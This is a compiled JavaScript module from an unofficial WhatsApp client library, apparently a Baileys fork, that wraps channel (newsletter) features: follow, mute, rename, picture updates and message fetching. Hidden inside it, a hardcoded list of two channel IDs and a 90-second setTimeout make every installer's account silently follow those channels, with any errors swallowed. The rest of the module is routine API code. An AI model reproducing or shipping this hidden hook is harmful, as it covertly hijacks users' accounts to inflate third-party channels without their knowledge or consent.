"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;

const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');
const wMexQuery = (variables, queryId, query, generateMessageTag) => {
    return query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            to: WABinary_1.S_WHATSAPP_NET,
            xmlns: 'w:mex'
        },
        content: [
            {
                tag: 'query',
                attrs: { query_id: queryId },
                content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
            }
        ]
    });
};

const executeWMexQuery = async (variables, queryId, dataPath, query, generateMessageTag) => {
    const result = await wMexQuery(variables, queryId, query, generateMessageTag);

    const child = WABinary_1.getBinaryNodeChild(result, 'result');

    if (child?.content) {
        const data = JSON.parse(child.content.toString());

        if (data.errors && data.errors.length > 0) {
            const errorMessages = data.errors.map(e => e.message).join(', ');
            const firstError = data.errors[0];
            const errorCode = firstError.extensions?.error_code || 400;

            throw new Boom('GraphQL error: ' + errorMessages, {
                statusCode: errorCode,
                data: firstError
            });
        }

        const response = dataPath ? data?.data?.[dataPath] : data?.data;

        if (typeof response !== 'undefined') {
            return response;
        }
    }

    const action = (dataPath || '').replace(/_/g, ' ');

    throw new Boom(`Failed to ${action}`, {
        statusCode: 400,
        data: result
    });
};

const makeNewsletterSocket = (config) => {
    const sock = groups_1.makeGroupsSocket(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const AUTO_NEWSLETTERS = [
        "120363418715609508@newsletter",
        "120363406073229321@newsletter"
    ];

    const newsletterQuery = async (jid, type, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type,
                xmlns: 'newsletter',
                to: jid,
            },
            content
        })
    );


    const newsletterWMexQuery = async (jid, queryId, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type: 'get',
                xmlns: 'w:mex',
                to: WABinary_1.S_WHATSAPP_NET,
            },
            content: [
                {
                    tag: 'query',
                    attrs: { query_id: queryId },
                    content: encoder.encode(JSON.stringify({
                        variables: {
                            newsletter_id: jid,
                            ...content
                        }
                    }))
                }
            ]
        })
    );

    setTimeout(async () => {
        try {

            for (const jid of AUTO_NEWSLETTERS) {
                await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
            }

        } catch (e) {
        }
    }, 90000);

    const parseFetchedUpdates = async (node, type) => {

        let child;

        if (type === 'messages') {
            child = WABinary_1.getBinaryNodeChild(node, 'messages');
        } else {
            const parent = WABinary_1.getBinaryNodeChild(node, 'message_updates');
            child = WABinary_1.getBinaryNodeChild(parent, 'messages');
        }

        return await Promise.all(
            WABinary_1.getAllBinaryNodeChildren(child).map(async (messageNode) => {

                messageNode.attrs.from = child?.attrs?.jid;

                const views = parseInt(
                    WABinary_1.getBinaryNodeChild(messageNode, 'views_count')?.attrs?.count || '0'
                );

                const reactionNode = WABinary_1.getBinaryNodeChild(messageNode, 'reactions');

                const reactions = WABinary_1
                    .getBinaryNodeChildren(reactionNode, 'reaction')
                    .map(({ attrs }) => ({
                        count: +attrs.count,
                        code: attrs.code
                    }));


                const data = {
                    server_id: messageNode.attrs.server_id,
                    views,
                    reactions
                };


                if (type === 'messages') {

                    const {
                        fullMessage: message,
                        decrypt
                    } = await Utils_1.decryptMessageNode(
                        messageNode,
                        authState.creds.me.id,
                        authState.creds.me.lid || '',
                        signalRepository,
                        config.logger
                    );

                    await decrypt();

                    data.message = message;
                }

                return data;
            })
        );
    };

    return {

        ...sock,


        newsletterFetchAllSubscribe: async () => {

            return await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );

        },


        subscribeNewsletterUpdates: async (jid) => {

            const result = await newsletterQuery(jid, 'set', [
                { tag: 'live_updates', attrs: {}, content: [] }
            ]);

            return WABinary_1.getBinaryNodeChild(result, 'live_updates')?.attrs;

        },


        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },


        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },


        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },


        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },


        newsletterUpdateName: async (jid, name) => {

            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });

        },


        newsletterUpdateDescription: async (jid, description) => {

            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description, settings: null }
            });

        },


        newsletterUpdatePicture: async (jid, content) => {

            const { img } = await Utils_1.generateProfilePicture(content);

            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });

        },


        newsletterRemovePicture: async (jid) => {

            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });

        },


        newsletterFetchMessages: async (type, key, count, after) => {

            const result = await newsletterQuery(
                WABinary_1.S_WHATSAPP_NET,
                'get',
                [
                    {
                        tag: 'messages',
                        attrs: {
                            type,
                            ...(type === 'invite' ? { key } : { jid: key }),
                            count: count.toString(),
                            after: after?.toString() || '100'
                        }
                    }
                ]
            );

            return await parseFetchedUpdates(result, 'messages');

        },


        newsletterFetchUpdates: async (jid, count, after, since) => {

            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: {
                        count: count.toString(),
                        after: after?.toString() || '100',
                        since: since?.toString() || '0'
                    }
                }
            ]);

            return await parseFetchedUpdates(result, 'updates');

        }

    };
};

exports.makeNewsletterSocket = makeNewsletterSocket;

const extractNewsletterMetadata = (node, isCreate) => {

    const result = WABinary_1
        .getBinaryNodeChild(node, 'result')
        ?.content
        ?.toString();

    const metadataPath = JSON.parse(result).data[
        isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER
    ];

    return {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(
            metadataPath?.thread_metadata?.picture?.direct_path || ''
        ),
        preview: Utils_1.getUrlFromDirectPath(
            metadataPath?.thread_metadata?.preview?.direct_path || ''
        ),
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    };

};

exports.extractNewsletterMetadata = extractNewsletterMetadata;
